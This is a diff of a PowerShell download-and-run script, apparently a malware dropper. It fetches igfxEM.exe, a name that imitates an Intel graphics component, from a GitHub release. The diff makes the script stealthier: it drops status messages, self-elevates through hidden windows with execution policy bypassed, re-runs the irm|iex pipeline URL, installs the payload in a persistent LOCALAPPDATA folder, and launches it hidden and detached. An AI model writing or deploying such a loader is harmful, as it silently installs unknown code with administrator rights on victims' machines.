@@ -1,61 +1,48 @@
-$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
+$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
 $AppName = "igfxEM.exe"
 $ErrorActionPreference = "Stop"
 
-# Check if Admin
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+# TLS
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Admin?
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+    [Security.Principal.WindowsBuiltInRole]::Administrator)
+
 if (-not $isAdmin) {
-    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
-
-    # Determine how to re-launch
-    if ($MyInvocation.Line -match 'https?://\S+') {
-        # Case 1: Running via "irm <url> | iex"
-        $originalUrl = ($MyInvocation.Line -match '(https?://\S+)')[1]
-
-        # Force TLS 1.2 in the new process BEFORE downloading
-        $newCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '$originalUrl' -UseBasicParsing | iex"
-
-        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$newCmd`""
+    # Silent elevate — same pipeline URL if irm|iex, else this file
+    if ($MyInvocation.Line -match '(https?://\S+)') {
+        $url = $Matches[1]
+        $cmd = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm '$url' | iex"
+        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd"
     } else {
-        # Case 2: Running from a file (.ps1)
-        $scriptPath = $PSCommandPath
-        if (-not $scriptPath) {
-            Write-Error "Could not determine script path."
-            exit 1
-        }
-        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $scriptPath = $MyInvocation.MyCommand.Path
+        if (-not $scriptPath) { $scriptPath = $PSCommandPath }
+        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
     }
-    exit
+    exit 0
 }
 
-# --- Rest of the script (runs as Admin) ---
-$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
-New-Item -ItemType Directory -Path $TempDir | Out-Null
-$ExePath = Join-Path $TempDir $AppName
+# Install dir (not random TEMP — survives better)
+$InstallDir = Join-Path $env:LOCALAPPDATA "igfxEM"
+New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
+$ExePath = Join-Path $InstallDir $AppName
 
-Write-Host "Downloading..." -ForegroundColor Cyan
 $ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
 
-# Ensure TLS 1.2 is set even if we didn't re-launch (safety net)
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
+# Kill old instance if any
+Get-Process -Name "igfxEM" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Milliseconds 300
 
-try {
-    Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
-} catch {
-    Write-Error "Failed to download: $_"
-    exit 1
-}
-
-Write-Host "Running..." -ForegroundColor Green
-
-# Launch exe fully detached from console session
+# DETACHED — no console, no redirect, not tied to this PowerShell
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = $ExePath
-$psi.WorkingDirectory = $TempDir
-$psi.UseShellExecute = $false
+$psi.WorkingDirectory = $InstallDir
+$psi.UseShellExecute = $true
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
-$psi.RedirectStandardOutput = $true
-$psi.RedirectStandardError = $true
-[System.Diagnostics.Process]::Start($psi) | Out-Null
+[void][System.Diagnostics.Process]::Start($psi)
 
-Write-Host "Done. igfxEM.exe is running in background." -ForegroundColor Green
+# Exit immediately — closing this window will NOT kill igfxEM
+exit 0
